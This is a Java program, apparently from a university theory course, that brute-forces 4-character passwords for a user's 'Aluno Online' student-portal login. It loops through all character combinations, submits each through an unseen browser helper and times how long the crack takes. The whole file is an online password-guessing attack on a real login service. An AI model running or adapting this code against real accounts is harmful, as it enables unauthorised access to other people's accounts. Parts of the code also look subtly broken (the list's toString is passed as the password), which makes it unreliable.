package br.iesb.teoria;

import java.io.FileWriter;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;

public class ForcaBruta {

    private static int N = 4;
    private static double initialTime;
    private static double interval;
    private static String usuario;

    public static void main(String[] args) throws Exception {
	FileWriter arq = new FileWriter(System.getProperty("user.dir") + "/src/br/iesb/teoria/resultados.txt", true);
	PrintWriter gravarArq = new PrintWriter(arq);
	Scanner sc = new Scanner(System.in);
	System.out.println("Login do Aluno Online: ");
	usuario = sc.next();
	initialTime = System.currentTimeMillis();
	crack();
	interval = System.currentTimeMillis() - initialTime;
	System.out.println("Tempo(seg): " + interval / 1000);
	gravarArq.println("Tempo(seg): " + interval / 1000);
	arq.close();
	sc.close();
    }

    private static void crack() {
	List<Character> bam = new ArrayList<Character>();
	Integer i;
	for (int j = 0; j < N; j++)
	    bam.add((char) 32);
	int c2 = 0, c3 = 0, c4 = 0;
	do {
	    i = 0;
	    if (bam.get(1) > 32 && c2 == 0) {
		c2 = 1;
		System.out.println("A partir do 2° char!");
	    } else if (bam.get(2) > 32 && c3 == 0) {
		c3 = 1;
		System.out.println("A partir do 3° char!");
	    } else if (bam.get(3) > 32 && c4 == 0) {
		c4 = 1;
		System.out.println("A partir do 4° char!");
	    }
	    nextChar(bam, i); // bam[i]++
	    while ((bam.get(i) == (char) 255) && (i < N)) {
		bam.set(i++, (char) 32);
		nextChar(bam, i); // bam[i]++
	    }
	} while (!Navegador.start(Arrays.asList(usuario, bam.toString())));
    }

    private static void nextChar(List<Character> bam, Integer i) {
	char temp = 0;
	temp = Character.valueOf(bam.get(i));
	temp = (char) (temp + 1);
	bam.set(i, temp);
    }

}
